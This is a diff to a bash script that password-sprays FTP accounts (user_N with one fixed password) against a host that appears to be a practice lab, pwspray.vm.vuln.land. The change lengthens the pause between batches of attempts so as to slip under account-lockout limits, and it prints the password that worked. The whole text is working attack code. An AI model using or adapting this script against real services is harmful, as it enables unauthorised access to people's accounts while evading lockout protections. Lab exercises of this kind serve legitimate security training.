@@ -12,13 +12,13 @@ for i in $( seq ${MYSTART} ${MYEND}); do
   ((MYCOUNTER++))
   if [[ $MYCOUNTER -eq 10 ]]; then
     date
-    echo "sleeping for 10 minutes"
-    sleep 605
+    echo "sleeping for 10 minutes and 15 seconds"
+    sleep 615
     MYCOUNTER=0
   fi
 
   curl --resolve pwspray.vm.vuln.land:21:152.96.14.197 --ftp-pasv ftp://user_${i}:${MYPASS}@pwspray.vm.vuln.land
-  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  ---------"; exit 0; else echo "user_${i} did not work";fi
+  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  --  $MYPASS   ---------"; exit 0; else echo "user_${i} did not work";fi
 
 
 done
